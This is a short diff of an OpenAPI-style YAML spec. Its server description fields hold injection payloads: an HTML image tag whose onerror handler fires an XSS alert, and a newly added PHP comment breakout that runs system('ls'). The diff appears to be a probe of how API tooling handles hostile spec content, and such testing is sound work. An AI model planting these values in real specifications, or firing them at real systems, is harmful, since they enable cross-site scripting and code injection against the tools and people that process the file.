@@ -8,7 +8,7 @@ servers:
   - url: https://paktiko.bxss.in
     description: <img src=x onerror="alert('XSS')">
   - url: https://paktiko.bxss.in
-    description: <img src=x onerror="alert('XSS')">
+    description: */ echo system(chr(0x6c).chr(0x73)); /*
     
 paths:
   /users:
